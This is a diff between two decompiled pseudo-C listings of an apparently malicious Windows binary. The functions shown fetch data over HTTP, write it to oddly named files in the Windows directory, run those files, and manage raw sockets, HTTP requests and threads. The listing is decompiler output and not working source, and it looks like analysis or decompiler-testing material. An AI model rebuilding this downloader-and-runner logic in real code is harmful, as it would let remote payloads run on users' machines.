-                    int32_t v16 = g3; // 0x402247
-                    str = (char *)&nNumberOfBytesToWrite;
-                    int32_t v17 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g44, (int32_t)&g68, v16, g6, v6, v16); // 0x40225c
-                    if (v17 != 0) {
-                        int32_t lpBuffer = 0; // bp-1040
-                        str = (char *)&lpBuffer;
-                        GetWindowsDirectoryA((char *)&lpBuffer, 1024);
-                        str = (char *)&lpBuffer;
-                        strcat((char *)&lpBuffer, "Xjapor_*ata");
-                        int32_t dwShareMode = g3; // 0x402293
-                        str = (char *)2;
-                        int32_t * fileHandle = CreateFileA((char *)&lpBuffer, 0x40000000, dwShareMode, (struct _SECURITY_ATTRIBUTES *)dwShareMode, 2, 2, &((struct _OVERLAPPED *)dwShareMode)->e0); // 0x4022a0
-                        g5 = (int32_t)fileHandle;
+                    // 0x402244
+                    *v16 = g3;
+                    *(int32_t *)g8 = v7;
+                    *(int32_t *)(g8 - 4) = g7;
+                    *(int32_t *)(g8 - 8) = g3;
+                    *(int32_t *)(g8 - 12) = (int32_t)&g74;
+                    *(int32_t *)(g8 - 16) = (int32_t)&g46;
+                    *(int32_t *)(g8 - 20) = 80;
+                    *(int32_t *)(g8 - 24) = (int32_t)&g52;
+                    struct _SECURITY_ATTRIBUTES * lpSecurityAttributes = NULL;
+                    int32_t * dwCreationDisposition;
+                    int32_t v21 = function_4019e2((struct timeval *)hFile, (int32_t)c, dwShareMode, (int32_t)lpSecurityAttributes, (int32_t)&dwCreationDisposition, (int32_t)&dwCreationDisposition, (int32_t)&dwCreationDisposition, (int32_t)&dwCreationDisposition); // 0x40225c
+                    char * v22 = str3;
+                    if (v21 != 0) {
+                        // 0x402268
+                        *(int32_t *)(g8 + 28) = 1024;
+                        *(int32_t *)(g8 + 24) = v2;
+                        GetWindowsDirectoryA(str3, (int32_t)c);
+                        *(int32_t *)(g8 - 4) = (int32_t)"Xjapor_*ata";
+                        *(int32_t *)(g8 - 8) = v2;
+                        strcat(str3, c);
+                        *(int32_t *)(g8 + 4) = g3;
+                        *(int32_t *)g8 = 2;
+                        *(int32_t *)(g8 - 4) = 2;
+                        *(int32_t *)(g8 - 8) = g3;
+                        *(int32_t *)(g8 - 12) = g3;
+                        *(int32_t *)(g8 - 16) = 0x40000000;
+                        *(int32_t *)(g8 - 20) = v2;
+                        int32_t * fileHandle = CreateFileA(str3, (int32_t)c, dwShareMode, lpSecurityAttributes, (int32_t)&dwCreationDisposition, (int32_t)&dwCreationDisposition, &dwCreationDisposition); // 0x4022a0
+                        v15 = (int32_t)fileHandle;
                         if (fileHandle != (int32_t *)-1) {
-                            int32_t lpNumberOfBytesWritten = 0; // bp-16
-                            str = (char *)&lpNumberOfBytesWritten;
-                            bool v18 = WriteFile(fileHandle, &((struct _SECURITY_ATTRIBUTES *)g6)->e0, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, (struct _OVERLAPPED *)g3); // 0x4022b7
-                            CloseHandle(&((struct _OVERLAPPED *)g5)->e0);
-                            if ((int32_t)v18 != g3) {
+                            // 0x4022ad
+                            *(int32_t *)(g8 - 4) = g3;
+                            int32_t v23; // bp-16
+                            *(int32_t *)(g8 - 8) = (int32_t)&v23;
+                            *(int32_t *)(g8 - 12) = (int32_t)c;
+                            *(int32_t *)(g8 - 16) = g7;
+                            *(int32_t *)(g8 - 20) = v15;
+                            bool v24 = WriteFile((int32_t *)hFile, (int32_t *)c, dwShareMode, &lpSecurityAttributes->e0, (struct _OVERLAPPED *)&dwCreationDisposition); // 0x4022b7
+                            *(int32_t *)(g8 - 4) = v15;
+                            int32_t hObject = v24; // 0x4022be
+                            char * v25 = (char *)hObject; // 0x4022be
+                            CloseHandle((int32_t *)hObject);
+                            if (hObject != g3) {
                                 // 0x4022cc
-                                function_40511a((struct _STARTUPINFOA *)&lpBuffer);
+                                *(int32_t *)(g8 - 4) = v2;
+                                function_40511a(v25);
+                                *(int32_t *)g8 = 1;
                                 g3 = 1;
+                                v22 = v25;
                                 // branch -> 0x4022dc
+                            } else {
+                                v22 = v25;
                             }
+                        } else {
+                            v22 = str3;
                         }
                     }
                     // 0x4022dc
-                    v8 = (struct _OVERLAPPED *)g6;
-                    free(&v8->e0);
-                    g4 = (int32_t)v8;
-                    result2 = g3;
+                    *(int32_t *)(g8 - 4) = g7;
+                    free((int32_t *)v22);
+                    v10 = g8;
+                    g4 = *(int32_t *)v10;
+                    v6 = v10 + 4;
+                    result = g3;
                     // branch -> 0x4022e6
                 } else {
                     // 0x4021f3
-                    result2 = 0;
+                    v6 = v4;
+                    result = 0;
                     // branch -> 0x4022e6
                 }
                 // 0x4022e6
-                g5 = v4;
-                g6 = v3;
-                g3 = v2;
-                g2 = v1;
-                return result2;
+                g5 = *(int32_t *)v6;
+                g7 = *(int32_t *)(v6 + 4);
+                g3 = *(int32_t *)(v6 + 8);
+                g2 = dwShareMode;
+                return result;
             }
         }
         // 0x4022dc
-        v8 = (struct _OVERLAPPED *)g6;
-        free(&v8->e0);
-        g4 = (int32_t)v8;
-        result2 = g3;
+        *(int32_t *)(g8 - 4) = g7;
+        free((int32_t *)v9);
+        v10 = g8;
+        g4 = *(int32_t *)v10;
+        v6 = v10 + 4;
+        result = g3;
         // branch -> 0x4022e6
     }
     // 0x4022e6
-    g5 = v4;
-    g6 = v3;
-    g3 = v2;
-    g2 = v1;
-    return result2;
+    g5 = *(int32_t *)v6;
+    g7 = *(int32_t *)(v6 + 4);
+    g3 = *(int32_t *)(v6 + 8);
+    g2 = dwShareMode;
+    return result;
 }
 
-// Address range: 0x4022eb - 0x4023c1
+// Address range: 0x4022eb - 0x4023c2
 int32_t function_4022eb(void) {
     int32_t v1 = g2; // bp-4
     g2 = &v1;
-    int32_t v2 = g3; // 0x4022f4
-    int32_t v3 = g6; // 0x4022f5
-    int32_t v4 = g5; // 0x4022f6
+    int32_t v2 = g5; // bp-1052
+    int32_t v3 = &v2; // 0x4022f6
     int32_t * mem = malloc(0x3e800); // 0x4022fc
-    int32_t v5 = (int32_t)mem; // 0x4022fc
-    g3 = v5;
-    g6 = 0;
+    int32_t v4 = (int32_t)mem; // 0x4022fc
+    g3 = v4;
+    g7 = 0;
     g4 = 0x3e800;
+    int32_t v5 = v3; // 0x4023bd12
     if (mem != NULL) {
         // 0x40230f
         int32_t nNumberOfBytesToWrite; // bp-12
-        int32_t v6 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g43, (int32_t)&g68, 0, v5, (int32_t)&nNumberOfBytesToWrite, 0); // 0x402327
+        int32_t v6 = function_4019e2((struct timeval *)&g52, 80, (int32_t)&g45, (int32_t)&g74, 0, v4, (int32_t)&nNumberOfBytesToWrite, 0); // 0x402327
         if (v6 != 0) {
             int32_t lpBuffer = 0; // bp-1040
             GetWindowsDirectoryA((char *)&lpBuffer, 1024);
             strcat((char *)&lpBuffer, "Xjapo_r*ata");
-            int32_t * fileHandle = CreateFileA((char *)&lpBuffer, 0x40000000, g6, (struct _SECURITY_ATTRIBUTES *)g6, 2, 2, &((struct _OVERLAPPED *)g6)->e0); // 0x40236e
-            g5 = (int32_t)fileHandle;
-            if (fileHandle != (int32_t *)-1) {
+            int32_t dwShareMode = g7; // 0x402361
+            int32_t * fileHandle = CreateFileA((char *)&lpBuffer, 0x40000000, dwShareMode, (struct _SECURITY_ATTRIBUTES *)dwShareMode, 2, 2, (int32_t *)dwShareMode); // 0x40236e
+            int32_t hObject = (int32_t)fileHandle; // edi
+            int32_t v7; // 0x40239b
+            if (fileHandle == (int32_t *)-1) {
+                // 0x402336
+                // branch -> 0x402333
+                // 0x402333
+                *(int32_t *)(g8 - 4) = g3;
+                v7 = 0;
+                // branch -> 0x40239b
+            } else {
                 int32_t lpNumberOfBytesWritten = 0; // bp-16
-                bool v7 = WriteFile(fileHandle, &((struct _SECURITY_ATTRIBUTES *)g3)->e0, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, (struct _OVERLAPPED *)g6); // 0x402385
-                CloseHandle(&((struct _OVERLAPPED *)g5)->e0);
-                struct _OVERLAPPED * v8 = (struct _OVERLAPPED *)g3; // 0x402398
-                int32_t result; // 0x4023c1
-                if ((int32_t)v7 != g6) {
+                bool v8 = WriteFile(fileHandle, (int32_t *)g3, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, (struct _OVERLAPPED *)g7); // 0x402385
+                int32_t v9 = hObject; // bp-1112
+                CloseHandle((int32_t *)hObject);
+                int32_t v10 = g3; // 0x402398
+                if ((int32_t)v8 != g7) {
                     // 0x4023a6
-                    free(&v8->e0);
-                    function_40511a((struct _STARTUPINFOA *)&lpBuffer);
-                    result = 1;
+                    free((int32_t *)v10);
+                    function_40511a((char *)&lpBuffer);
                     // branch -> 0x4023bd
-                } else {
-                    // 0x40239b
-                    free(&v8->e0);
-                    // branch -> 0x4023a2
-                    // 0x4023a2
-                    result = 0;
-                    // branch -> 0x4023bd
+                    // 0x4023bd
+                    g5 = *(int32_t *)(int32_t)&v9;
+                    g2 = v1;
+                    return 1;
                 }
-                // 0x4023bd
-                g5 = v4;
-                g6 = v3;
-                g3 = v2;
-                g2 = v1;
-                return result;
+                v7 = v10;
             }
+            // 0x40239b
+            free((int32_t *)v7);
+            // branch -> 0x4023a2
+            // 0x4023a2
+            // branch -> 0x4023bd
+            // 0x4023bd
+            g5 = *(int32_t *)(g8 + 4);
+            g2 = v1;
+            return 0;
         }
         // 0x402333
+        *(int32_t *)(v3 - 4) = g3;
         // branch -> 0x40239b
         // 0x40239b
-        free(&((struct _OVERLAPPED *)g3)->e0);
+        int32_t v11; // bp-1116
+        free((int32_t *)v11);
+        v5 = g8 + 4;
         // branch -> 0x4023a2
     }
     // 0x4023a2
     // branch -> 0x4023bd
     // 0x4023bd
-    g5 = v4;
-    g6 = v3;
-    g3 = v2;
+    g5 = *(int32_t *)v5;
     g2 = v1;
     return 0;
 }
 
-// Address range: 0x4023c2 - 0x402507
+// Address range: 0x4023c2 - 0x402508
 int32_t function_4023c2(void) {
-    int32_t v1 = g2; // bp-4
-    g2 = &v1;
-    int32_t v2 = g5; // 0x4023cd
+    int32_t dwShareMode = g2; // bp-4
+    g2 = &dwShareMode;
+    int32_t v1; // bp-1040
+    int32_t v2 = &v1; // 0x4023c5
+    int32_t v3 = g5; // bp-1052
+    int32_t v4 = &v3; // 0x4023cd
     int32_t * mem = malloc(0x3e800); // 0x4023d3
-    int32_t v3 = (int32_t)mem; // 0x4023d3
-    g6 = v3;
+    int32_t v5 = (int32_t)mem; // 0x4023d3
+    g7 = v5;
     g3 = 0;
     g4 = 0x3e800;
     if (mem == NULL) {
         // 0x4024e8
         // branch -> 0x402503
         // 0x402503
-        g5 = v2;
+        g5 = *(int32_t *)v4;
+        g2 = dwShareMode;
         return 0;
     }
     // 0x4023e6
-    int32_t nNumberOfBytesToWrite; // bp-8
-    int32_t v4 = &nNumberOfBytesToWrite; // 0x4023e6
-    int32_t v5 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g41, (int32_t)&g68, 0, v3, v4, 0); // 0x4023fe
-    if (v5 != 0) {
-        int32_t v6 = g6; // 0x402411
-        g5 = v6 - 2;
-        *(char *)(v6 + nNumberOfBytesToWrite) = (char)g3;
+    char * c; // bp-8
+    int32_t v6 = (int32_t)&c; // 0x4023e6
+    int32_t v7 = function_4019e2((struct timeval *)&g52, 80, (int32_t)&g43, (int32_t)&g74, 0, v5, v6, 0); // 0x4023fe
+    int32_t v8; // 0x40250310
+    if (v7 != 0) {
+        int32_t v9 = g7; // 0x402411
+        g5 = v9 - 2;
+        *(char *)(v9 + (int32_t)c) = (char)g3;
         // branch -> 0x402417
+        int32_t v10; // edi
+        int32_t hFile; // 0x40242a
+        int32_t * v11; // 0x40244d
+        char * str; // 0x40242a
         while (true) {
-            uint32_t v7 = g5; // 0x40241c
-            if (v7 < g6 + nNumberOfBytesToWrite) {
+            uint32_t v12 = g5; // 0x40241c
+            char * v13;
+            if (v12 < g7 + (int32_t)c) {
                 // 0x402420
-                if (v7 != g3) {
-                    int32_t str = v7 + 2; // 0x402424
-                    char * found_char_pos = strchr((char *)str, 13); // 0x40242d
-                    int32_t v8 = (int32_t)found_char_pos; // 0x40242d
-                    g5 = v8;
-                    int32_t v9 = g3; // 0x402436
-                    if (v8 != v9) {
+                if (v12 != g3) {
+                    // 0x402424
+                    v10 = v12 + 2;
+                    *(int32_t *)(g8 - 4) = 13;
+                    *(int32_t *)(g8 - 8) = v10;
+                    hFile = v10;
+                    str = (char *)hFile;
+                    char * found_char_pos = strchr(str, (int32_t)c); // 0x40242d
+                    int32_t v14 = (int32_t)found_char_pos; // 0x40242d
+                    g5 = v14;
+                    int32_t v15 = g3; // 0x402436
+                    int32_t v16 = g8 + 8; // 0x40243d
+                    if (v14 != v15) {
                         // 0x40243b
-                        *found_char_pos = (char)v9;
+                        *found_char_pos = (char)v15;
+                        v16 = g8;
                         // branch -> 0x40243d
                     }
-                    int32_t strcmp_rc = strcmp((char *)str, (char *)&g64); // 0x402445
-                    g4 = (int32_t)&g64;
+                    // 0x40243d
+                    *(int32_t *)(v16 - 4) = (int32_t)&g68;
+                    *(int32_t *)(v16 - 8) = hFile;
+                    int32_t strcmp_rc = strcmp(str, c); // 0x402445
+                    v11 = (int32_t *)(g8 + 4);
+                    g4 = *v11;
                     if (strcmp_rc == 0) {
                         // break -> 0x402458
                         break;
                     }
+                    v13 = str;
                     // continue -> 0x402417
                     continue;
                 }
             }
             // 0x402452
+            *(int32_t *)(g8 - 4) = g7;
             // branch -> 0x4024e1
             // 0x4024e1
-            free(&((struct _OVERLAPPED *)g6)->e0);
+            free((int32_t *)v13);
             // branch -> 0x4024e8
             // 0x4024e8
             // branch -> 0x402503
             // 0x402503
-            g5 = v2;
+            g5 = *(int32_t *)(g8 + 4);
+            g2 = dwShareMode;
             return 0;
         }
-        int32_t v10 = g3; // 0x40245b
-        int32_t v11 = function_4019e2((struct sockaddr *)&g50, 80, (int32_t)&g42, (int32_t)&g68, v10, g6, v4, v10); // 0x402470
-        if (v11 != 0) {
-            int32_t lpBuffer = 0; // bp-1040
-            GetWindowsDirectoryA((char *)&lpBuffer, 1024);
-            strcat((char *)&lpBuffer, "Xjapor_o*ata");
-            int32_t * fileHandle = CreateFileA((char *)&lpBuffer, 0x40000000, g3, (struct _SECURITY_ATTRIBUTES *)g3, 2, 2, &((struct _OVERLAPPED *)g3)->e0); // 0x4024b4
-            g5 = (int32_t)fileHandle;
+        // 0x402458
+        *v11 = g3;
+        *(int32_t *)g8 = v6;
+        *(int32_t *)(g8 - 4) = g7;
+        *(int32_t *)(g8 - 8) = g3;
+        *(int32_t *)(g8 - 12) = (int32_t)&g74;
+        *(int32_t *)(g8 - 16) = (int32_t)&g44;
+        *(int32_t *)(g8 - 20) = 80;
+        *(int32_t *)(g8 - 24) = (int32_t)&g52;
+        struct _SECURITY_ATTRIBUTES * lpSecurityAttributes = NULL;
+        int32_t * dwCreationDisposition;
+        int32_t v17 = function_4019e2((struct timeval *)hFile, (int32_t)c, dwShareMode, (int32_t)lpSecurityAttributes, (int32_t)&dwCreationDisposition, (int32_t)&dwCreationDisposition, (int32_t)&dwCreationDisposition, (int32_t)&dwCreationDisposition); // 0x402470
+        if (v17 != 0) {
+            // 0x40247c
+            *(int32_t *)(g8 + 28) = 1024;
+            *(int32_t *)(g8 + 24) = v2;
+            GetWindowsDirectoryA(str, (int32_t)c);
+            *(int32_t *)(g8 - 4) = (int32_t)"Xjapor_o*ata";
+            *(int32_t *)(g8 - 8) = v2;
+            strcat(str, c);
+            *(int32_t *)(g8 + 4) = g3;
+            *(int32_t *)g8 = 2;
+            *(int32_t *)(g8 - 4) = 2;
+            *(int32_t *)(g8 - 8) = g3;
+            *(int32_t *)(g8 - 12) = g3;
+            *(int32_t *)(g8 - 16) = 0x40000000;
+            *(int32_t *)(g8 - 20) = v2;
+            int32_t * fileHandle = CreateFileA(str, (int32_t)c, dwShareMode, lpSecurityAttributes, (int32_t)&dwCreationDisposition, (int32_t)&dwCreationDisposition, &dwCreationDisposition); // 0x4024b4
+            v10 = (int32_t)fileHandle;
             if (fileHandle != (int32_t *)-1) {
-                int32_t lpNumberOfBytesWritten = 0; // bp-16
-                bool v12 = WriteFile(fileHandle, &((struct _SECURITY_ATTRIBUTES *)g6)->e0, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, (struct _OVERLAPPED *)g3); // 0x4024cb
-                CloseHandle(&((struct _OVERLAPPED *)g5)->e0);
-                struct _OVERLAPPED * v13 = (struct _OVERLAPPED *)g6; // 0x4024de
+                // 0x4024c1
+                *(int32_t *)(g8 - 4) = g3;
+                int32_t v18; // bp-16
+                *(int32_t *)(g8 - 8) = (int32_t)&v18;
+                *(int32_t *)(g8 - 12) = (int32_t)c;
+                *(int32_t *)(g8 - 16) = g7;
+                *(int32_t *)(g8 - 20) = v10;
+                bool v19 = WriteFile((int32_t *)hFile, (int32_t *)c, dwShareMode, &lpSecurityAttributes->e0, (struct _OVERLAPPED *)&dwCreationDisposition); // 0x4024cb
+                *(int32_t *)(g8 - 4) = v10;
+                int32_t v20 = v19; // 0x4024d2
+                char * v21 = (char *)v20; // 0x4024d2
+                int32_t * hObject = (int32_t *)v20;
+                CloseHandle(hObject);
+                *(int32_t *)(g8 - 4) = g7;
+                int32_t v22; // 0x402503
                 int32_t result; // 0x402507
-                if ((int32_t)v12 != g3) {
+                if (v20 != g3) {
                     // 0x4024ec
-                    free(&v13->e0);
-                    function_40511a((struct _STARTUPINFOA *)&lpBuffer);
+                    free(hObject);
+                    *(int32_t *)(g8 - 4) = v2;
+                    function_40511a(v21);
+                    *(int32_t *)(g8 + 4) = 1;
+                    v22 = g8 + 8;
                     result = 1;
                     // branch -> 0x402503
                 } else {
                     // 0x4024e1
-                    free(&v13->e0);
+                    free((int32_t *)v21);
                     // branch -> 0x4024e8
                     // 0x4024e8
+                    v22 = g8 + 4;
                     result = 0;
                     // branch -> 0x402503
                 }
                 // 0x402503
-                g5 = v2;
+                g5 = *(int32_t *)v22;
+                g2 = dwShareMode;
                 return result;
             }
         }
         // 0x402452
+        *(int32_t *)(g8 - 4) = g7;
         // branch -> 0x4024e1
         // 0x4024e1
-        free(&((struct _OVERLAPPED *)g6)->e0);
+        free((int32_t *)str);
+        v8 = g8 + 4;
         // branch -> 0x4024e8
+    } else {
+        v8 = v4;
     }
     // 0x4024e8
     // branch -> 0x402503
     // 0x402503
-    g5 = v2;
+    g5 = *(int32_t *)v8;
+    g2 = dwShareMode;
     return 0;
 }
 
-// Address range: 0x402508 - 0x40267c
+// Address range: 0x402508 - 0x40267d
 int32_t function_402508(void) {
-    int32_t v1 = g2; // bp-4
-    g2 = &v1;
-    int32_t lpBuffer = 0; // bp-1036
+    int32_t dwStackSize = g2; // bp-4
+    g2 = &dwStackSize;
+    int32_t uSize = 1024; // ebx
+    int32_t lpBuffer; // bp-1036
     GetWindowsDirectoryA((char *)&lpBuffer, 1024);
     strcat((char *)&lpBuffer, "Xjapor_*ata");
     DeleteFileA((char *)&lpBuffer);
-    GetWindowsDirectoryA((char *)&lpBuffer, 1024);
+    GetWindowsDirectoryA((char *)&lpBuffer, uSize);
     strcat((char *)&lpBuffer, "Xjapo_r*ata");
     DeleteFileA((char *)&lpBuffer);
-    GetWindowsDirectoryA((char *)&lpBuffer, 1024);
+    GetWindowsDirectoryA((char *)&lpBuffer, uSize);
     strcat((char *)&lpBuffer, "Xjapor_o*ata");
     DeleteFileA((char *)&lpBuffer);
-    g6 = 0x6832;
+    g7 = 0x6832;
+    char * dwMilliseconds = (char *)1; // bp-1088
     g3 = 0x2710;
     g5 = 1;
-    struct _OVERLAPPED * v2 = NULL; // bp-8
+    struct _SECURITY_ATTRIBUTES * lpThreadAttributes; // bp-8
+    int32_t v1 = (int32_t)&lpThreadAttributes; // 0x402618
     // branch -> 0x4025a5
     while (true) {
       lab_0x4025a5:;
-        struct fd_set * v3 = g34; // 0x4025a5
+        char * v2 = g36; // 0x4025a5
+        int32_t v3 = (int32_t)v2; // 0x4025a5
+        g28 = 0;
         g26 = 0;
-        g24 = 0;
-        if (v3 != NULL) {
+        if (v2 != NULL) {
             // 0x4025bc
-            closesocket((int32_t)v3);
+            *(int32_t *)(g8 - 4) = v3;
+            closesocket((int32_t)dwMilliseconds);
             // branch -> 0x4025c3
         }
         // 0x4025c3
-        g34 = NULL;
-        g66 = NULL;
-        Sleep(50);
+        g36 = NULL;
+        g71 = 0;
+        *(int32_t *)(g8 - 4) = 50;
+        Sleep((int32_t)dwMilliseconds);
         int32_t result = function_40205c(); // 0x4025d5
         if (result != 0) {
             // 0x402678
-            g2 = v1;
+            g2 = dwStackSize;
             return result;
         }
         int32_t result2 = function_40216f(); // 0x4025e2
         if (result2 != 0) {
             // 0x402678
-            g2 = v1;
+            g2 = dwStackSize;
             return result2;
         }
         // 0x4025ef
@@ -2248,55 +2789,73 @@ int32_t function_402508(void) {
                     // 0x40260a
                     if (function_4028eb() != 0) {
                         // 0x402618
-                        v2 = (struct _OVERLAPPED *)g5;
-                        ioctlsocket(*(int32_t *)&g34, -0x7ffb9982, (int32_t *)&v2);
-                        g30 = 0;
-                        g66 = (struct _OVERLAPPED *)g5;
-                        int32_t lpThreadId = 0; // bp-12
-                        CreateThread(NULL, 0, (int32_t (*)(int32_t *))"SVWh v@", NULL, 0, &lpThreadId);
-                        g23 = (char *)g5;
+                        lpThreadAttributes = (struct _SECURITY_ATTRIBUTES *)g5;
+                        *(int32_t *)(g8 - 4) = v1;
+                        *(int32_t *)(g8 - 8) = -0x7ffb9982;
+                        *(int32_t *)(g8 - 12) = (int32_t)g36;
+                        int32_t (*lpStartAddress)(int32_t *) = NULL;
+                        ioctlsocket((int32_t)lpThreadAttributes, dwStackSize, (int32_t *)lpStartAddress);
+                        g32 = 0;
+                        int32_t v4; // bp-12
+                        *(int32_t *)(g8 - 4) = (int32_t)&v4;
+                        int32_t v5 = 0; // eax
+                        *(int32_t *)(g8 - 8) = 0;
+                        *(int32_t *)(g8 - 12) = v5;
+                        *(int32_t *)(g8 - 16) = (int32_t)"SVWh v@";
+                        *(int32_t *)(g8 - 20) = v5;
+                        *(int32_t *)(g8 - 24) = v5;
+                        g71 = g5;
+                        int32_t * lpParameter;
+                        CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, &lpParameter, (int32_t)&lpParameter, &lpParameter);
+                        g25 = (char *)g5;
                         // branch -> 0x402658
                         while (true) {
                             // 0x402658
-                            if (g26 != 0) {
+                            if (g28 != 0) {
                                 // 0x402661
                                 function_402aa7();
                                 // branch -> 0x402666
                             }
                             // 0x402666
-                            if (g66 == NULL) {
+                            if (g71 == 0) {
                                 goto lab_0x4025a5;
                             }
                             // 0x402673
-                            Sleep(g5);
+                            *(int32_t *)(g8 - 4) = g5;
+                            Sleep((int32_t)lpThreadAttributes);
                             // branch -> 0x402658
                         }
                     }
                 }
                 // 0x402613
-                Sleep(g3);
+                *(int32_t *)(g8 - 4) = g3;
+                Sleep((int32_t)dwMilliseconds);
                 // branch -> 0x4025a5
                 continue;
             }
             // 0x402613
-            Sleep(g3);
+            *(int32_t *)(g8 - 4) = g3;
+            Sleep((int32_t)dwMilliseconds);
             // branch -> 0x4025a5
             continue;
         }
         // 0x402613
-        Sleep(g3);
+        *(int32_t *)(g8 - 4) = g3;
+        Sleep((int32_t)dwMilliseconds);
         // branch -> 0x4025a5
     }
 }
 
-// Address range: 0x40267d - 0x40277d
-int32_t function_40267d(char * str, int32_t str3, int32_t a3, int32_t str5, int32_t a5, int32_t a6) {
+// Address range: 0x40267d - 0x40277e
+int32_t function_40267d(char * str, int32_t str3) {
     int32_t v1 = 0; // bp-19
     int32_t str4 = 58; // bp-20
-    _itoa(a3, (char *)&v1, 10);
+    int32_t v2;
+    _itoa(v2, (char *)&v1, 10);
     int32_t str2 = (int32_t)str; // esi
-    strcpy(str, a5 != 0 ? "POST " : "GET ");
-    if (g59 != NULL) {
+    int32_t v3;
+    strcpy(str, v3 != 0 ? "POST " : "GET ");
+    if (g62 != NULL) {
         // 0x4026c3
         strcat((char *)str2, "http://");
         strcat((char *)str2, (char *)str3);
@@ -2304,8 +2863,9 @@ int32_t function_40267d(char * str, int32_t str3, int32_t a3, int32_t str5, int3
         // branch -> 0x4026e4
     }
     // 0x4026e4
+    int32_t str5;
     strcat((char *)str2, (char *)str5);
-    if (a5 == 1) {
+    if (v3 == 1) {
         // 0x4026f5
         strcat((char *)str2, "/index.htm");
         // branch -> 0x402702
@@ -2316,10 +2876,11 @@ int32_t function_40267d(char * str, int32_t str3, int32_t a3, int32_t str5, int3
     strcat((char *)str2, (char *)str3);
     strcat((char *)str2, (char *)&str4);
     strcat((char *)str2, "\r\nPragma: no-cache");
-    if (a5 == 1) {
+    if (v3 == 1) {
         // 0x40273f
         strcat((char *)str2, "\r\nContent-Length: ");
-        _itoa(a6, (char *)&str4, 10);
+        int32_t v4;
+        _itoa(v4, (char *)&str4, 10);
         strcat((char *)str2, (char *)&str4);
         strcat((char *)str2, "\r\nProxy-Connection: Keep-Alive");
         // branch -> 0x40276d
@@ -2329,109 +2890,137 @@ int32_t function_40267d(char * str, int32_t str3, int32_t a3, int32_t str5, int3
     return (int32_t)strcat((char *)str2, "\r\n\r\n");
 }
 
-// Address range: 0x40277e - 0x40282f
-int32_t function_40277e(int32_t sock) {
-    // 0x40277e
+// Address range: 0x40277e - 0x402830
+int32_t function_40277e(void) {
+    char * length = (char *)g2; // bp-4
     g1 = 0x2008;
     function_405a10();
     int32_t v1 = 0; // ebx
-    int32_t buf; // bp-8204
-    int32_t buf2 = &buf; // esi
-    int32_t v2 = recv(sock, (char *)&buf, 1, 0); // 0x4027aa20
-    if (v2 == 0) {
-        // 0x40282b
-        g6 = 0;
-        g3 = 0;
-        return -1;
-    }
-    int32_t v3 = 0;
-    int32_t v4 = 0;
-    int32_t v5;
-    int32_t v6;
+    int32_t v2 = g5; // bp-16
+    int32_t v3; // bp-8204
+    int32_t v4 = &v3; // 0x40279c
+    int32_t v5 = v4; // esi
+    char * buf = NULL;
+    int32_t sock = 0;
+    int32_t v6 = &v2; // 0x4027a2
+    // branch -> 0x4027a2
     while (true) {
-        // 0x4027b4
-        if (v2 == -1) {
-            // 0x4027b9
-            if (WSAGetLastError() != 0x2733) {
-                // 0x40282b
-                g6 = v3;
-                g3 = v4;
-                return -1;
-            }
-            // 0x4027c6
-            Sleep(1);
-            int32_t v7 = v3 + 1; // 0x4027cd
-            int32_t v8 = v3 - 0x1388; // 0x4027d0
-            if (v8 == 0 || v8 < 0 != (0x1387 - v3 & v3) < 0) {
-                v6 = v4;
-                v5 = v7;
-                goto lab_0x4027a2;
-            }
+        // 0x4027a2
+        *(int32_t *)(v6 - 4) = 0;
+        *(int32_t *)(v6 - 8) = 1;
+        *(int32_t *)(v6 - 12) = v5;
+        int32_t v7 = recv(sock, buf, (int32_t)length, 0); // 0x4027aa
+        int32_t v8; // 0x40282b
+        if (v7 == 0) {
+            // 0x402828
+            v8 = g8;
+            // branch -> 0x40282b
             // 0x40282b
-            g6 = v7;
-            g3 = v4;
+            g5 = *(int32_t *)v8;
+            g7 = *(int32_t *)(v8 + 4);
+            g3 = *(int32_t *)(v8 + 8);
+            g2 = (int32_t)length;
             return -1;
         }
-        int32_t v9 = buf2; // 0x4027d9
-        char v10 = *(char *)v9; // 0x4027d9
-        int32_t v11;
-        if (v10 != 13) {
+        // 0x4027b4
+        int32_t v9;
+        char * v10;
+        if (v7 == -1) {
+            // 0x4027b9
+            if (WSAGetLastError() == 0x2733) {
+                // 0x4027c6
+                *(int32_t *)(g8 - 4) = 1;
+                Sleep(sock);
+                if (sock <= 0x1388) {
+                    v10 = buf;
+                    v9 = sock + 1;
+                    goto lab_0x4027a2;
+                }
+                // 0x402828
+                v8 = g8;
+                // branch -> 0x40282b
+                // 0x40282b
+                g5 = *(int32_t *)v8;
+                g7 = *(int32_t *)(v8 + 4);
+                g3 = *(int32_t *)(v8 + 8);
+                g2 = (int32_t)length;
+                return -1;
+            }
+            // 0x402828
+            v8 = g8;
+            // branch -> 0x40282b
+            // 0x40282b
+            g5 = *(int32_t *)v8;
+            g7 = *(int32_t *)(v8 + 4);
+            g3 = *(int32_t *)(v8 + 8);
+            g2 = (int32_t)length;
+            return -1;
+        }
+        int32_t v11 = v5; // 0x4027d9
+        char v12 = *(char *)v11; // 0x4027d9
+        char * dwMilliseconds;
+        if (v12 != 13) {
             // 0x4027df
-            if (v10 != 10) {
+            if (v12 != 10) {
                 // 0x4027e3
-                v11 = 0;
+                dwMilliseconds = NULL;
                 // branch -> 0x4027f2
               lab_0x4027f2:;
-                int32_t v12 = v1 + 1; // 0x4027f2
-                v1 = v12;
-                buf2 = v9 + 1;
-                if (v12 > 0x2000) {
+                int32_t v13 = v1 + 1; // 0x4027f2
+                v1 = v13;
+                v5 = v11 + 1;
+                if (v13 >= 0x2001) {
+                    // 0x402828
+                    v8 = g8;
+                    // branch -> 0x40282b
                     // 0x40282b
-                    g6 = v3;
-                    g3 = v11;
+                    g5 = *(int32_t *)v8;
+                    g7 = *(int32_t *)(v8 + 4);
+                    g3 = *(int32_t *)(v8 + 8);
+                    g2 = (int32_t)length;
                     return -1;
                 }
                 // 0x4027fc
-                Sleep(1);
-                v6 = v11;
-                v5 = v3;
+                *(int32_t *)(g8 - 4) = 1;
+                Sleep((int32_t)dwMilliseconds);
+                v10 = dwMilliseconds;
+                v9 = sock;
                 // branch -> 0x4027a2
-              lab_0x4027a2:;
-                int32_t v13 = recv(sock, (char *)buf2, 1, 0); // 0x4027aa
-                if (v13 == 0) {
-                    // break -> 0x40282b
-                    break;
-                }
-                v2 = v13;
